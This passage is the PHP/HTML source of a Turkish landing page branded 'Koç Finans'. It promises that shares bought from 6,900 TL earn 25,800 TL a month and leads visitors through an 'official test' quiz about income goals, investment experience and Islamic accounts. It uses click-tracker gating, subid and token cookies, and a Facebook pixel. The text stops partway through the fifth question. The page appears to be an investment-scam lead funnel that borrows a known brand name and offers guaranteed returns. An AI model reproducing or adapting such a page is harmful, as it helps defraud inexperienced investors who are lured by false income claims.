<?php
if (!isset($rawClick) && !isset($click)) {
  die();
}
?>
<?php

include_once dirname(__FILE__) . '/config.php';

?>
<!DOCTYPE html>
<html
  lang="tr"
  style="background-color: rgb(255, 255, 255)"
  class="wf-inter-n4-active wf-inter-n6-active wf-inter-n7-active wf-active"
>
  <head>
    <style>
      .overlay-B8BMangixI {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0, 0, 0, 0.8);
        z-index: 1000;
        -webkit-box-pack: center;
        -webkit-justify-content: center;
        -ms-flex-pack: center;
        justify-content: center;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        overflow-y: auto;
        display: none;
      }

      .lds-spinner-B8BMangixI {
        color: official;
        display: inline-block;
        position: relative;
        width: 80px;
        height: 80px;
      }

      .lds-spinner-B8BMangixI div {
        transform-origin: 40px 40px;
        animation: lds-spinner-B8BMangixI 1.2s linear infinite;
      }

      .lds-spinner-B8BMangixI div:after {
        content: " ";
        display: block;
        position: absolute;
        top: 3px;
        left: 37px;
        width: 6px;
        height: 18px;
        border-radius: 20%;
        background: #fff;
      }

      .lds-spinner-B8BMangixI div:nth-child(1) {
        transform: rotate(0deg);
        animation-delay: -1.1s;
      }

      .lds-spinner-B8BMangixI div:nth-child(2) {
        transform: rotate(30deg);
        animation-delay: -1s;
      }

      .lds-spinner-B8BMangixI div:nth-child(3) {
        transform: rotate(60deg);
        animation-delay: -0.9s;
      }

      .lds-spinner-B8BMangixI div:nth-child(4) {
        transform: rotate(90deg);
        animation-delay: -0.8s;
      }

      .lds-spinner-B8BMangixI div:nth-child(5) {
        transform: rotate(120deg);
        animation-delay: -0.7s;
      }

      .lds-spinner-B8BMangixI div:nth-child(6) {
        transform: rotate(150deg);
        animation-delay: -0.6s;
      }

      .lds-spinner-B8BMangixI div:nth-child(7) {
        transform: rotate(180deg);
        animation-delay: -0.5s;
      }

      .lds-spinner-B8BMangixI div:nth-child(8) {
        transform: rotate(210deg);
        animation-delay: -0.4s;
      }

      .lds-spinner-B8BMangixI div:nth-child(9) {
        transform: rotate(240deg);
        animation-delay: -0.3s;
      }

      .lds-spinner-B8BMangixI div:nth-child(10) {
        transform: rotate(270deg);
        animation-delay: -0.2s;
      }

      .lds-spinner-B8BMangixI div:nth-child(11) {
        transform: rotate(300deg);
        animation-delay: -0.1s;
      }

      .lds-spinner-B8BMangixI div:nth-child(12) {
        transform: rotate(330deg);
        animation-delay: 0s;
      }

      @keyframes lds-spinner-B8BMangixI {
        0% {
          opacity: 1;
        }

        100% {
          opacity: 0;
        }
      }

      .visible-B8BMangixI {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
      }
    </style>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0k user-scalable=no"
    />

    <title>Koç Finans</title>
    <link rel="shortcut icon" href="images/favicon.png" type="image/x-icon" />

    <style>
      input#sendForm {
        color: #fff !important;
        background-color: #ff5100 !important;
      }
    </style>

    <link href="css/app.css" rel="stylesheet" />

    <link rel="stylesheet" href="css/leadForm.css" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="" />
    <link
      href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&display=swap"
      rel="stylesheet"
    />
    <style>
      b,
      h1,
      h2,
      h3,
      h4,
      h5,
      p,
      a,
      span,
      div,
      input,
      button,
      form,
      * {
        font-family: "Lato", sans-serif !important;
      }
    </style>
    <script src="./js/jquery-3.6.1.min.js"></script>
    <script src="form/js/libs/intlTelInput.js"></script>

    <script src="form/js/libs/jquery.maskedinput.js"></script>
    <script src="form/js/libs/utils.js"></script>

    <script type="application/javascript">
      function getCookie(name) {
        var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
        return v ? v[2] : null;
      }

      function setCookie(name, value, days) {
        var d = new Date();
        d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
        document.cookie =
          name + "=" + value + ";path=/;expires=" + d.toGMTString();
      }

      function getSubId() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{subid}".match("{")) {
          return "{subid}";
        }
        var clientSubid =
          '<?php echo isset($client) ? $client->getSubid() : "" ?>';
        if (!clientSubid.match(">")) {
          return clientSubid;
        }
        if (params.get("_subid")) {
          return params.get("_subid");
        }
        if (params.get("subid")) {
          return params.get("subid");
        }
        if (getCookie("subid")) {
          return getCookie("subid");
        }
      }

      function getToken() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{token}".match("{")) {
          return "{token}";
        }
        var clientToken =
          '<?php echo isset($client) ? $client->getToken() : "" ?>';
        if (!clientToken.match(">")) {
          return clientToken;
        }
        if (params.get("_token")) {
          return params.get("_token");
        }
        if (params.get("token")) {
          return params.get("token");
        }
        if (getCookie("token")) {
          return getCookie("token");
        }
        return null;
      }

      function getPixel() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{pixel}".match("{")) {
          return "{pixel}";
        }
        if (params.get("pixel")) {
          return params.get("pixel");
        }

        if (getCookie("pixel")) {
          return getCookie("pixel");
        }

        return null;
      }

      if (typeof URLSearchParams === "function") {
        document.addEventListener("DOMContentLoaded", function (event) {
          var params = new URLSearchParams(document.location.search.substr(1));
          var subid = getSubId();
          var token = getToken();
          var pixel = getPixel();

          params.set("_token", token);
          setCookie("pixel", pixel);
          setCookie("token", token);
          setCookie("subid", subid);
        });
      }
    </script>

    <!--PIXEL DEFENCE-->
    <?php if($FacebookPixel): ?>
    <script type="application/javascript">
      !(function (f, b, e, v, n, t, s) {
        if (f.fbq) return;
        n = f.fbq = function () {
          n.callMethod
            ? n.callMethod.apply(n, arguments)
            : n.queue.push(arguments);
        };
        if (!f._fbq) f._fbq = n;
        n.push = n;
        n.loaded = !0;
        n.version = "2.0";
        n.queue = [];
        t = b.createElement(e);
        t.async = !0;
        t.src = v;
        s = b.getElementsByTagName(e)[0];
        s.parentNode.insertBefore(t, s);
      })(
        window,
        document,
        "script",
        "https://connect.facebook.net/en_US/fbevents.js"
      );
      fbq("init", "<?=$FacebookPixel ?>");
      fbq("track", "PageView");
    </script>
    <?php endif; ?>
  </head>

  <body style="background-color: rgb(255, 255, 255)">
    <div
      class="app-wrapper light-blue"
      style="
        --color: #142143;
        --color-lighten: #c9ac14;
        --color-lighten10: #fae057;
        --color-lighten2: #fae057;
        --color-darken: #002d75;
        --color-darken10: #0041a8;
        --color-alpha: rgba(0, 84, 221, 0.5);
        --color-alpha2: rgba(0, 84, 221, 0.2);
        --color-alpha3: rgba(0, 84, 221, 0.05);
        --color-text: #ffffff;
        --color-text2: #0054dd;
        --gradient-main: 331deg, rgb(0, 45, 117), rgb(66, 139, 255);
        --color-primary-text-button: #fff;
        --color-bg-sidebar: #f7f7f7;
        --color-bg-1: #ededed;
        --color-bg-2: #e6e6e6;
        --color-bg-3: #cccccc;
        --color-bg-4: #b3b3b3;
        --color-bg-5: #999999;
        --color-bg-6: rgba(0, 0, 0, 0.7);
        --color-bg-7: #ededed;
        --color-bg-8: #d9d9d9;
        --color-bg-9: #363636;
        --color-bg-text: #000000;
        --color-bg-quiz: #ffffff;
        --color-bg-alpha0: rgba(255, 255, 255, 0);
        --color-bg-alpha2: rgba(0, 0, 0, 0.2);
        --color-bg-alpha7: rgba(0, 0, 0, 0.7);
        --color-white-label: #ffffff;
        --color-bg-sub-text: #a6a6a6;
        --font: 'Inter';
      "
    >
      <div id="app" class="app">
        <div class="layout" id="mainForm">
          <div class="app__start-page test-step active">
            <div
              class="start-page columns is-desktop-modal start-page_has_bg start-page_position_right start-page_mode_start start-page_theme_expanded"
            >
              <div class="head-logo" style="position: relative">
                <div class="b-quiz-question__title">
                  <div class="logo__img">
                    <img src="images/logo-white.png" />
                  </div>
                  <div
                    id="start-menu"
                    class="nav-menu"
                    style="display: flex; width: 50%; justify-content: flex-end"
                  >
                    <div
                      class="phone__img"
                      style="align-self: center; padding: 0 15px"
                    >
                      <img width="24" height="24" src="images/icon-call.svg" />
                    </div>
                    <div
                      style="
                        margin-right: 20px !important;
                        align-self: center;
                        padding: 0 15px;
                      "
                    >
                      <svg
                        width="24"
                        height="24"
                        fill="white"
                        viewBox="0 0 20 20"
                        xmlns="http://www.w3.org/2000/svg"
                      >
                        <rect y="9" width="20" height="2"></rect>
                        <rect y="3" width="20" height="2"></rect>
                        <rect y="15" width="20" height="2"></rect>
                      </svg>
                    </div>
                  </div>
                </div>
              </div>

              <div class="video-background">
                <video
                  playsinline="playsinline"
                  autoplay="autoplay"
                  muted="muted"
                  loop="loop"
                  poster="_preview.png"
                >
                  <source src="media/video.mp4" type="video/mp4" />
                </video>
              </div>

              <div class="video-background-mobile">
                <video
                  playsinline="playsinline"
                  autoplay="autoplay"
                  muted="muted"
                  loop="loop"
                  poster="_preview.png"
                >
                  <source src="media/video.mp4" type="video/mp4" />
                </video>
              </div>

              <div
                class="start-page__content column is-1"
                style="z-index: 100; left: 1px !important; max-width: 55%"
              >
                <div class="start-page__body">
                  <div class="start-page__line" style="width: 60px"></div>
                  <img
                    src="images/logo.png"
                    alt="Koç Finans"
                    style="max-width: 280px; width: 100%; margin-bottom: 25px"
                  />
                  <h1 class="start-page__header">
                    Koç Finans hisselerini 6 900 TL'den başlayan miktarla satın
                    alarak her ay 25.800 kazanabilirsiniz
                  </h1>
                </div>
              </div>
              <div class="start-page__content column is-5" style="z-index: 100">
                <div class="start-page__body">
                  <div class="start-page__line"></div>
                  <h1 class="start-page__header">
                    "Koç Finans Anonim Şirketi" ile hayallerinizi nasıl
                    gerçekleştirebilirsiniz?
                  </h1>
                  <h2 class="start-page__subheader">
                    Platforma erişmek ve ülkenin kaynaklarından sabit para
                    kazanmaya başlamak için Koç Finans Kurumu'nun resmi testine
                    giriniz.
                  </h2>
                  <button
                    type="button"
                    class="start-page__button button is-primary is-blicked has-light-shadow next-btn"
                  >
                    <span class="icon">
                      <svg viewBox="0 0 24 24" class="mdi-icon mdi-24px">
                        <title>mdi-checkbox-marked-circle-outline</title>
                        <path
                          d="M20,12C20,16.42 16.42,20 12,20C7.58,20 4,16.42 4,12C4,7.58 7.58,4 12,4C12.76,4 13.5,4.11 14.2,4.31L15.77,2.74C14.61,2.26 13.34,2 12,2C6.48,2 2,6.48 2,12C2,17.52 6.48,22 12,22C17.52,22 22,17.52 22,12M7.91,10.08L6.5,11.5L11,16L21,6L19.59,4.58L11,13.17L7.91,10.08Z"
                          stroke-width="0"
                          fill-rule="nonzero"
                        ></path>
                      </svg>
                    </span>
                      Teste başla
                  </button>

                  <div class="halal_container">
                    <img
                      class="next-btn halal_icon"
                      width="150px"
                      height="150px"
                      src="images/halal.png"
                      alt="halal"
                    />
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div class="quiz-container test-step">
            <div class="head-logo" style="z-index: 1000; position: relative">
              <div class="b-quiz-question__title" style="display: flex">
                <div class="logo__img">
                  <img src="images/logo-white.png" />
                </div>
                <div
                  class="nav-menu"
                  style="display: flex; width: 50%; justify-content: flex-end"
                ></div>
              </div>
            </div>
            <div class="quiz">
              <div class="quiz__questions">
                <div class="quiz__questions-header">
                  <div
                    class="title quiz__question-title quiz__question-title_without-title"
                  >
                    <span class="is-block q-uestion">
                      1. Her Türkiye vatandaşının, ülkenin kaynaklarının
                      ticaretinden gelir elde etmesi gerektiğine inanıyor
                      musunuz?
                    </span>
                  </div>
                </div>
                <div
                  class="question quiz__question question_variants"
                  id="DJ17A5860g"
                >
                  <div class="answer-variants answer-variants_has_image">
                    <div
                      class="answer-variants__group"
                      data-question="1"
                      data-questionnew="1. Her Turkiye vatandasinin, ulkenin kaynaklarinin ticaretinden gelir elde etmesi gerektigine inaniyor musunuz?"
                    >
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Evet"
                        data-answernew="a"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_1"
                            value="Evet"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">Evet</div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Hayır"
                        data-answernew="b"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_1"
                            value="Hayır"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">Hayır</div>
                            </div>
                          </span>
                        </label>
                      </div>
                    </div>
                    <div class="answer-variants__image">
                      <img
                        src="images/1.png"
                        alt=""
                        class="answer-variants__image-img"
                      />
                    </div>
                  </div>
                </div>
                <div
                  class="quiz__whitelabel quiz__whitelabel_mobile"
                  style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  "
                ></div>
                <div class="quiz__buttons">
                  <div class="quiz-buttons is-outline">
                    <div class="quiz-buttons__progress">
                      <div class="progress-bar">
                        <div class="progress-bar-circular-steps">
                          <div class="progress-bar-circular-steps__label">
                            <span>B</span><span>i</span><span>r</span
                            ><span>i</span><span>n</span><span>c</span
                            ><span>i</span> <span>a</span><span>d</span
                            ><span>i</span><span>m</span>
                          </div>
                          <div
                            class="progress-bar-circular-steps__gradient-wrapp"
                            style="--left-percent: 0%; --right-percent: 50%"
                          >
                            <div
                              class="progress-bar-circular-steps__steps"
                              style="left: 0px"
                            >
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <!-- Question 2 -->
          <div class="quiz-container test-step">
            <div class="head-logo" style="z-index: 1000; position: relative">
              <div class="b-quiz-question__title" style="display: flex">
                <div class="logo__img">
                  <img src="images/logo-white.png" />
                </div>
                <div
                  class="nav-menu"
                  style="display: flex; width: 50%; justify-content: flex-end"
                ></div>
              </div>
            </div>
            <div class="quiz">
              <div class="quiz__questions">
                <div class="quiz__questions-header">
                  <div
                    class="title quiz__question-title quiz__question-title_without-title"
                  >
                    <span class="is-block q-uestion"
                      >2. Arzularınızı yerine getirmek için ayda ne kadar para
                      yeterlidir?
                    </span>
                  </div>
                </div>
                <div
                  class="question quiz__question question_variants"
                  id="DJ17A5860g"
                >
                  <div class="answer-variants answer-variants_has_image">
                    <div
                      class="answer-variants__group"
                      data-question="2. Arzularınızı yerine getirmek için ayda ne kadar para yeterlidir?"
                      data-questionnew="2"
                    >
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="8.000 TL"
                        data-answernew="a"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_2"
                            value="8.000 TL"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">8.000 TL</div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="10.000 TL"
                        data-answernew="b"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_2"
                            value="10.000 TL"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">10.000 TL</div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="25.000 TL"
                        data-answernew="c"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_2"
                            value="25.000 TL"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">25.000 TL</div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="25.000 TL üzeri"
                        data-answernew="d"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_2"
                            value="25.000 TL üzeri"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">25.000 TL üzeri</div>
                            </div>
                          </span>
                        </label>
                      </div>
                    </div>
                    <div class="answer-variants__image">
                      <img
                        src="images/2.png"
                        alt=""
                        class="answer-variants__image-img"
                      />
                    </div>
                  </div>
                </div>
                <div
                  class="quiz__whitelabel quiz__whitelabel_mobile"
                  style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  "
                ></div>
                <div class="quiz__buttons">
                  <div class="quiz-buttons is-outline">
                    <div class="quiz-buttons__progress">
                      <div class="progress-bar">
                        <div class="progress-bar-circular-steps">
                          <div class="progress-bar-circular-steps__label">
                            <span>İ</span><span>k</span><span>i</span
                            ><span>n</span><span>c</span><span>i</span>
                            <span>a</span><span>d</span><span>i</span
                            ><span>m</span>
                          </div>
                          <div
                            class="progress-bar-circular-steps__gradient-wrapp"
                            style="--left-percent: 0%; --right-percent: 50%"
                          >
                            <div
                              class="progress-bar-circular-steps__steps"
                              style="left: 0px"
                            >
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <!-- Question 3 -->
          <div class="quiz-container test-step">
            <div class="head-logo" style="z-index: 1000; position: relative">
              <div class="b-quiz-question__title" style="display: flex">
                <div class="logo__img">
                  <img src="images/logo-white.png" />
                </div>
                <div
                  class="nav-menu"
                  style="display: flex; width: 50%; justify-content: flex-end"
                ></div>
              </div>
            </div>
            <div class="quiz">
              <div class="quiz__questions">
                <div class="quiz__questions-header">
                  <div
                    class="title quiz__question-title quiz__question-title_without-title"
                  >
                    <span class="is-block q-uestion"
                      >3. Servetinizi hangi amaçla artırmak istiyorsunuz?</span
                    >
                  </div>
                </div>
                <div
                  class="question quiz__question question_variants"
                  id="DJ17A5860g"
                >
                  <div class="answer-variants answer-variants_has_image">
                    <div
                      class="answer-variants__group"
                      data-question="Servetinizi hangi amaçla artırmak istiyorsunuz?"
                      data-questionnew="3"
                    >
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Geleceğinizi güvence altına almak"
                        data-answernew="a"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_3"
                            value="Geleceğinizi güvence altına almak"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Geleceğinizi güvence altına almak
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Ailenize yardım etmek"
                        data-answernew="b"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_3"
                            value="Ailenize yardım etmek"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Ailenize yardım etmek
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Krediyi/ipoteği ödemek"
                        data-answernew="c"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_3"
                            value="Krediyi/ipoteği ödemek"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Krediyi/ipoteği ödemek
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Ev veya araba satın almak"
                        data-answernew="d"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_3"
                            value="Ev veya araba satın almak"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Ev veya araba satın almak
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                    </div>
                    <div class="answer-variants__image">
                      <img
                        src="images/3.png"
                        alt=""
                        class="answer-variants__image-img"
                      />
                    </div>
                  </div>
                </div>
                <div
                  class="quiz__whitelabel quiz__whitelabel_mobile"
                  style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  "
                ></div>
                <div class="quiz__buttons">
                  <div class="quiz-buttons is-outline">
                    <div class="quiz-buttons__progress">
                      <div class="progress-bar">
                        <div class="progress-bar-circular-steps">
                          <div class="progress-bar-circular-steps__label">
                            <span>Ü</span><span>ç</span><span>ü</span
                            ><span>n</span><span>c</span><span>ü</span>
                            <span>a</span><span>d</span><span>i</span
                            ><span>m</span>
                          </div>
                          <div
                            class="progress-bar-circular-steps__gradient-wrapp"
                            style="--left-percent: 0%; --right-percent: 50%"
                          >
                            <div
                              class="progress-bar-circular-steps__steps"
                              style="left: 0px"
                            >
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <!-- Question 4 -->
          <div class="quiz-container test-step">
            <div class="head-logo" style="z-index: 1000; position: relative">
              <div class="b-quiz-question__title" style="display: flex">
                <div class="logo__img">
                  <img src="images/logo-white.png" />
                </div>
                <div
                  class="nav-menu"
                  style="display: flex; width: 50%; justify-content: flex-end"
                ></div>
              </div>
            </div>
            <div class="quiz">
              <div class="quiz__questions">
                <div class="quiz__questions-header">
                  <div
                    class="title quiz__question-title quiz__question-title_without-title"
                  >
                    <span class="is-block q-uestion"
                      >4. Yatırım konusunda deneyiminiz var mı?</span
                    >
                  </div>
                </div>
                <div
                  class="question quiz__question question_variants"
                  id="DJ17A5860g"
                >
                  <div class="answer-variants answer-variants_has_image">
                    <div
                      class="answer-variants__group"
                      data-question="Yatırım konusunda deneyiminiz var mı?"
                      data-questionnew="4"
                    >
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Hayır, ama daha fazla bilgi edinmek istiyorum"
                        data-answernew="a"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_4"
                            value="Hayır, ama daha fazla bilgi edinmek istiyorum"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Hayır, ama daha fazla bilgi edinmek istiyorum
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Evet, başarılı"
                        data-answernew="b"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_4"
                            value="Evet, başarılı"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">Evet, başarılı</div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Evet, başarısız"
                        data-answernew="c"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_4"
                            value="Evet, başarısız"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">Evet, başarısız</div>
                            </div>
                          </span>
                        </label>
                      </div>
                    </div>
                    <div class="answer-variants__image">
                      <img
                        src="images/4.png"
                        alt=""
                        class="answer-variants__image-img"
                      />
                    </div>
                  </div>
                </div>
                <div
                  class="quiz__whitelabel quiz__whitelabel_mobile"
                  style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  "
                ></div>
                <div class="quiz__buttons">
                  <div class="quiz-buttons is-outline">
                    <div class="quiz-buttons__progress">
                      <div class="progress-bar">
                        <div class="progress-bar-circular-steps">
                          <div class="progress-bar-circular-steps__label">
                            <span>D</span><span>ö</span><span>r</span
                            ><span>d</span><span>ü</span><span>n</span
                            ><span>c</span><span>ü</span> <span>a</span
                            ><span>d</span><span>ı</span><span>m</span>
                          </div>
                          <div
                            class="progress-bar-circular-steps__gradient-wrapp"
                            style="--left-percent: 0%; --right-percent: 50%"
                          >
                            <div
                              class="progress-bar-circular-steps__steps"
                              style="left: 0px"
                            >
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <!-- Question 5 -->
          <div class="quiz-container test-step">
            <div class="head-logo" style="z-index: 1000; position: relative">
              <div class="b-quiz-question__title" style="display: flex">
                <div class="logo__img">
                  <img src="images/logo-white.png" />
                </div>
                <div
                  class="nav-menu"
                  style="display: flex; width: 50%; justify-content: flex-end"
                ></div>
              </div>
            </div>
            <div class="quiz">
              <div class="quiz__questions">
                <div class="quiz__questions-header">
                  <div
                    class="title quiz__question-title quiz__question-title_without-title"
                  >
                    <span class="is-block q-uestion"
                      >5. İslami hesabınız var mı?</span
                    >
                  </div>
                </div>
                <div
                  class="question quiz__question question_variants"
                  id="DJ17A5860g"
                >
                  <div class="answer-variants answer-variants_has_image">
                    <div
                      class="answer-variants__group"
                      data-question="İslami hesabınız var mı?"
                      data-questionnew="5"
                    >
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Evet"
                        data-answernew="a"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_5"
                            value="Evet"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">Evet</div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="HAYIR"
                        data-answernew="b"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_5"
                            value="HAYIR"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">HAYIR</div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Bunu yapmayı planlıyorum"
                        data-answernew="c"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_5"
                            value=" Bunu yapmayı planlıyorum"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Bunu yapmayı planlıyorum
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                    </div>
                    <div class="answer-variants__image">
                      <img
                        src="images/5.png"
                        alt=""
                        class="answer-variants__image-img"
                      />
                    </div>
                  </div>
                </div>
                <div
                  class="quiz__whitelabel quiz__whitelabel_mobile"
                  style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  "
                ></div>
                <div class="quiz__buttons">
                  <div class="quiz-buttons is-outline">
                    <div class="quiz-buttons__progress">
                      <div class="progress-bar">
                        <div class="progress-bar-circular-steps">
                          <div class="progress-bar-circular-steps__label">
                            <span>B</span><span>e</span><span>ş</span
                            ><span>i</span><span>n</span><span>c</span
                            ><span>i</span> <span>a</span><span>d</span
                            ><span>ı</span><span>m</span>
                          </div>
                          <div
